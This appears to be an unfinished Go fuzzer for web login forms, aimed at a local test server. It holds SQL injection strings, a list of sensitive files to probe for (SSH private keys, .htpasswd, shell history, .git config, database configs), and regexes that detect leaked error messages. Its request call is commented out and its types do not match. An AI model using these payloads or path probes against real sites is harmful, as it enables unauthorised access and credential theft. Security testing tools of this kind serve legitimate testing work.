package main

import (
	"fmt"
	"regexp"
	"time"
	"github.com/parnurzeal/gorequest"
)

//injection
var body_injection = []string{"' or '1'='1", "'--", "1'", "admin'--", "/*!10000%201/0%20*/", "/*!10000 1/0 */", "1/0", "'%20o/**/r%201/0%20--", "' o/**/r 1/0 --", ";", "'%20and%201=2%20--", "' and 1=2 --", "test�%20UNION%20select%201,%20@@version,%201,%201;�", "test� UNION select 1, @@version, 1, 1;�"}
var head_injection = []string{"/.ssh/known_hosts", "/.ssh/authorized_keys", "/.ssh/id_dsa", "/.ssh/id_dsa.bak", "/.ssh/id_dsa.old", "/.ssh/id_dsa~", "/.ssh/id_rsa", "/.ssh/id_rsa.bak", "/.ssh/id_rsa.old", "/.ssh/id_rsa~", "/.htaccess", "/.htaccess.bak", "/.htaccess.old", "/htaccess.txt", "/.htaccess~", "/.htpasswd", "/.htpasswd.bak", "/.htpasswd.old", "/.htpasswd~", "/.bash_history", "/.bashrc", "/.history", "/.profile", "/.mysql_history", "/~root", "/.git/config", "/.git/HEAD", "/.git/index", "/.svn/entries", "/.svn/wc.db", "/pccsmysqladm/incs/dbconnect.inc", "/perl/", "/phpBB/phpinfo.php", "/weblogic", "/wp-admin/wp-login.php", "/wp-content/debug.log", "/WEB-INF/web.xml", "/iisadmin/", "/iissamples/", "/index.jsp", "/index.php", "/index.html.bak", "/index.html.old", "/index.html~", "/manager", "/config/database.yml", "/config/initializers/secret_token.rb", "/db/seeds.rb", "/db/development.sqlite3"}

//rules
var rules = []string{".*Runtime (E|e)rror.*", ".*SQLSTATE: [A-Z0-9].*", ".*(s|S)tack:.*", ".*(s|S)yntax (e|E)rror\\s.*", ".*\\w+/\\d{1,2}(\\.\\d{1,3})+.*", ".*Invalid column name\\s.*", ".* (ORA|EXP|IMP|KUP|UDE|UDI|DBV|LCD|QSM|OCI|RMAN|LFI|PLS|PLQ|AMD|CLSR|PROC|PROT|TNS|NNC|NLP|NNF|NMP|NCR|NZE|O2F|O2I|O2U|PCB|PCC|SQL|AUD|IMG|VID|DRG|LPX|LSX)-\\d{5}\\s .*", ".*(p|P)owered by:? ([a-zA-Z]+)( [a-zA-Z]+){0,3}( |/)\\d\\.\\d{1,2}\\.\\d{1,3}.*", ".*at [\\w\\$]+(\\.[\\w\\$<>\\[\\],]+|\\.\\.ctor)+(\\((([\\w\\$<>\\`\\[\\]]+ [\\w\\$<>]+, )*(([\\w\\$<>\\`\\[\\]]+ [\\w\\$<>]+)))\\)|\\(\\)) .*", ".*Traceback \\(most recent call last\\):.*", ".*((I|i)ncorrect|(I|i)nvalid) (s|S)yntax.*", ".*(s|S)tack ?(t|T)race.*", ".*(e|E)rror was:\\s.*", ".*(v|V)ersion:? \\d\\.\\d{1,2}\\.{1,3}-?.*", ".*from [\\w\\$]+(\\.[\\w\\$<>]+)+:\\d+:in `.+'.*", ".*Error in process <\\d+\\.\\d+\\.\\d+> with exit value:.*", ".*STACK\\s?TRACE.*", ".*Warning: [\\w]+\\(\\) .+ in .+ on line \\d{1,6}.*", ".*((A|a)pache|vBulletin|MySQL|PostgreSQL|phpBB|Internet Information Services)( |/)\\d{1,2}(\\.\\d{1,3})+ .*", ".*at [a-zA-Z][\\w\\$]*(\\.[a-zA-Z][\\w\\$]*)+\\((Unknown Source|Native Method|[a-zA-Z][\\w\\$]*\\.([a-zA-Z]{3,5}):\\d+)\\) .*", ".*[^\\s]+\\.rb:\\d+:in `.+'.*", ".*<\\w+:frame\\s*class=\".*\"\\s*line=\".*\"\\s*method=\".*\"\\s*/>.*", ".*File \".+\", line [0-9]{1,6}, in.*"}

var url = "http://127.0.0.1:5000/"
var body = map[string]interface{}{
	"uid":         "121212121",
	"pwd":         "274427f9fdb9a3b9e66b5898a698ab569e371550a3132552891f2f4e67d925e01dd6e865b9f2d24fad8d50c899edd84fb76f4755f31f7cfb22e988a150277aa1cfd60149a7af6a5404d8f43314c6035af017d5a5693dc2b4741148bc3468fb70fc61532bd88740f0118d0236e5f2586ed2bb6651df987fb2968dfff8b14a4ca5",
	"Service":     "soufun-passport-web",
	"AutoLogin":   "0",
	"Operatetype": "0",
	"Gt":          "35c3d8dffffd310ca05d87cea3b52786",
	"Challenge":   "d6cff20d4dd1eeb034aab289b4c4f05b",
	"Validate":    "1537cef64e19da1cf43ca875e77e89c0",
}

func http_request(url string, body map[string]string) (Resp string) {
	request := gorequest.New()
	_, resp, _ := request.Post(url).
		Head("Content-Type:application/json").
		Send(body).
		End()
	return resp
}

func re_rule(rule, resp string) {
	ret := regexp.MustCompile(string(rule))
	alls := ret.FindAllStringSubmatch(resp, -1)
	fmt.Println(alls)
}

//body_injection
func body_injection_fun() {
	t := time.Now()
	fmt.Printf("开始时间: %d-%d-%d %d:%d:%d\n", t.Year(),
		t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
	ch2 := make(chan int)
	go func() {
		for key, value := range body {
			ch1 := make(chan int)
			go func() {
				for index := range body_injection {
					body[key] = body_injection[index]
					//resp := http_request(url, body)
					ch := make(chan int)
					go func() {
						for rule := range rules {
							//re_rule(rules[rule], resp)
							fmt.Println(body, rule)
						}
						ch <- 3
					}()
					val := <-ch
					fmt.Println(val)
					body[key] = value
				}
				ch1 <- 2
			}()
			val := <-ch1
			fmt.Println(val)
		}
		ch2 <- 1
	}()
	val := <-ch2
	fmt.Println(val)
	n := time.Now()
	fmt.Printf("结束时间: %d-%d-%d %d:%d:%d\n", n.Year(),
		n.Month(), n.Day(), n.Hour(), n.Minute(), n.Second())
}

// path
// func main() {
// 	url := body["url"]
// 	fmt.Println(url)
// 	for head := range head_injection {
// 		new_url := url.(string) + string(head_injection[head])
// 		fmt.Println(new_url)
// 	}
// }

// var mbody2 = map[string]interface{}{
// 	"uid":         "121212121",
// 	"pwd":         "274427f9fdb9a3b9e66b5898a698ab569e371550a3132552891f2f4e67d925e01dd6e865b9f2d24fad8d50c899edd84fb76f4755f31f7cfb22e988a150277aa1cfd60149a7af6a5404d8f43314c6035af017d5a5693dc2b4741148bc3468fb70fc61532bd88740f0118d0236e5f2586ed2bb6651df987fb2968dfff8b14a4ca5",
// 	"Service":     "soufun-passport-web",
// 	"AutoLogin":   "0",
// 	"Operatetype": "0",
// 	"Gt":          "35c3d8dffffd310ca05d87cea3b52786",
// 	"Challenge":   "d6cff20d4dd1eeb034aab289b4c4f05b",
// 	"Validate":    "1537cef64e19da1cf43ca875e77e89c0",
// }

// var body = map[string]interface{}{
// 	"request_url":  "http://127.0.0.1:5000/",
// 	"request_body": mbody2,
// }

// func main() {
// 	fmt.Println(body)
// }
